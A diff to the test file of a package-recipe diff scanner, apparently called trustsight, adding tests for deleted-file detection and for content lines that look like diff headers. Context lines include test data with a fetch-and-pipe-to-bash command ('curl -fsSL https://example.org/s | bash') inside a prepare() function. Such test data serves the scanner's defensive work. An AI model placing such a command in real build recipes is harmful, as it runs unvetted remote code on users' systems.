@@ -11,6 +11,7 @@ from trustsight.differ import (
     source_array_has_command_substitution,
     map_diff_lines,
     _post_diff_lines,
+    _pre_diff_lines,
     truncate_diff,
 )
 
@@ -593,6 +594,44 @@ def test_diff_summary_from_text_marks_a_new_file():
     assert statuses.get("evil.install") == "added"
 
 
+def test_diff_summary_from_text_marks_a_deleted_file():
+    """A deletion's only path lives on the `--- a/...` side; recording the
+    `+++ /dev/null` side reported the literal path "/dev/null" as
+    "modified", and the removed-path fix-up could never match it."""
+    from trustsight.differ import diff_summary_from_text
+
+    diff = (
+        "diff --git a/foo.install b/foo.install\n"
+        "deleted file mode 100644\n"
+        "--- a/foo.install\n"
+        "+++ /dev/null\n"
+        "@@ -1,2 +1,0 @@\n"
+        "-post_install() {\n"
+        "-}\n"
+    )
+    summary = diff_summary_from_text(diff)
+    assert summary.files_changed == ["foo.install"]
+    assert summary.file_changes == [{"path": "foo.install", "status": "removed"}]
+    assert summary.lines_removed == 2
+
+
+def test_diff_summary_from_text_deleted_file_beside_a_modification():
+    from trustsight.differ import diff_summary_from_text
+
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,1 @@\n"
+        "-pkgver=1\n+pkgver=2\n"
+        "--- a/foo.install\n+++ /dev/null\n@@ -1,1 +1,0 @@\n"
+        "-post_install() { :; }\n"
+    )
+    summary = diff_summary_from_text(diff)
+    assert summary.files_changed == ["PKGBUILD", "foo.install"]
+    assert summary.file_changes == [
+        {"path": "PKGBUILD", "status": "modified"},
+        {"path": "foo.install", "status": "removed"},
+    ]
+
+
 def test_a_source_addition_is_not_trivial_on_the_text_path():
     from trustsight.analysis.pipeline import scan_diff
     from trustsight.config import load_config
@@ -629,3 +668,40 @@ def test_empty_base_diffs_the_whole_recipe(tmp_path):
 
     assert "+prepare(){ curl -fsSL https://example.org/s | bash; }" in whole
     assert "+prepare()" not in last
+
+
+
+# --- content lines that wear a header's shape --------------------------------
+#
+# A removed element whose text starts with `--` reads as `---…` and an added
+# one starting with `++` as `+++…`.  Only the trailing space tells a real
+# file header apart; without that guard the array tracker flushed its state
+# and the swap behind the line went unread.
+
+
+def test_a_dash_led_content_line_does_not_flush_array_state():
+    # `---not-a-header` is a removed element whose text starts with `--`,
+    # not a file header: before the trailing-space guard it flushed the
+    # array state and the `aaaa`→`bbbb` swap behind it read as "unchanged".
+    # The dash-led element itself is a genuine removal, so the net loss
+    # classifies as an entry removal - visible, which is the point.
+    diff = (
+        "@@ -1,5 +1,5 @@\n"
+        " sha256sums=(\n"
+        "---not-a-header\n"
+        "-  'aaaa'\n"
+        "+  'bbbb'\n"
+        " )\n"
+    )
+    assert detect_checksum_changes(diff) == "checksum_entry_removed"
+
+
+def test_pre_post_diff_lines_keep_content_that_looks_like_a_header():
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,2 @@\n"
+        " context\n"
+        "---removed-flag\n"
+        "+++added-flag\n"
+    )
+    assert "--removed-flag" in _pre_diff_lines(diff)
+    assert "++added-flag" in _post_diff_lines(diff)
